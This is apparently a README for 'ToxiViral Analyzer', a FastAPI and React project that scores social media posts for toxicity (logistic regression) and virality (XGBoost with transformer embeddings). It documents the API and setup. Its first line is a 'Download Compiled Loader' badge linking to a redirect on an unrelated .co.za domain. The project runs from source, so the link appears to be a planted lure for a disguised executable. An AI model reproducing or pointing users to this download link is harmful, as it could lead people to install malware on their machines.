# ToxiViral Analyzer

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

ToxiViral is a full-stack AI project that scores social media posts for toxicity and virality in one pass. The backend is a FastAPI service that runs a toxicity classifier plus a virality regressor, and the frontend is a Vite + React UI that submits tweet-like inputs and renders the combined assessment.

## What It Does

- Scores toxicity (0-1) and labels it Low/Moderate/High Risk.
- Predicts virality from structured tweet/user features using an XGBoost model.
- Produces a Risk-Reach category that combines toxicity and virality into a single recommendation.

## Architecture

- Backend: FastAPI (`backend/app/main.py`)
- Inference: `backend/app/utils/inference.py`
  - Toxicity: TF-IDF + Logistic Regression (trained model in `backend/trained_models`)
- Virality: XGBoost regressor with transformer embeddings
- Frontend: Vite + React (`frontend/src/App.jsx`)

## Models

### Toxicity (Baseline)

- Model: TF-IDF + Logistic Regression
- Artifact: `backend/trained_models/baseline_toxicity_model.joblib`
- Training script: `backend/notebooks/train_baseline_toxicity.py`

### Virality (Production)

- Model: XGBoost regressor with transformer embeddings
- Artifact: `backend/trained_models/virality_xgb_embed_model.json`
- Feature metadata: `backend/trained_models/virality_xgb_embed_metadata.json`
- Reducer: `backend/trained_models/virality_xgb_embed_reducer.joblib`
- Training script: `backend/notebooks/train_virality_transformer.py`

## Virality Features (Transformer + Structured)

The XGBoost model uses structured features plus transformer embeddings reduced to 128 dimensions:

- Structured: followers/friends (log + ratio), verification, account age
- Time: hour, day-of-week, sine/cosine encodings
- Text stats: word count, hashtags, mentions, URL count, emoji count, exclamation, question marks
- Uppercase ratio, digit ratio, bio length, location presence
- Embeddings: `digio/Twitter4SSE` with mean pooling, reduced with SVD to 128 dims

The virality raw prediction is mapped to a 0-1 score using log scaling for UI display.

## API

Base URL: `http://127.0.0.1:8001`

### POST /api/analyze

Request body:

```
{
  "tweet": "string",
  "user_followers": 1500,
  "user_verified": false,
  "user_friends": 300,
  "location": "New York",
  "date": "2023-02-24 07:59:26+00:00",
  "user_created": "2010-05-06 09:05:00+00:00",
  "user_description": "Bio or profile description"
}
```

### POST /api/predict-virality

Same schema as `/api/analyze`, but returns only the virality payload.

### POST /api/predict-toxicity

Request body:

```
{
  "text": "string"
}
```

## Run Locally

### Backend (Port 8001)

```
START_BACKEND.bat
```

Docs: `http://127.0.0.1:8001/docs`

### Frontend (Port 5173)

```
START_FRONTEND.bat
```

Open: `http://localhost:5173`

## Training Data

- Toxicity data: Jigsaw Toxic Comments (see `DATASETS_NEEDED.md`)
- Virality data: `deberain/ChatGPT-Tweets` (Hugging Face)
- Virality target formula: `likes + 1.5 * retweets`

## Repository Layout

```
backend/
  app/
  data/
  notebooks/
  trained_models/
frontend/
  src/
Virality_model_lab/
  virality_xgboost_cv_fixed.ipynb
  models/virality_cv_fixed/
```

## Notes

- The backend expects the trained artifacts to exist in `backend/trained_models`.
- The frontend currently sends optional `date`, `user_created`, and `user_description` to improve virality predictions.
- `digio/Twitter4SSE` is not published in native sentence-transformers format; it is loaded with mean pooling.
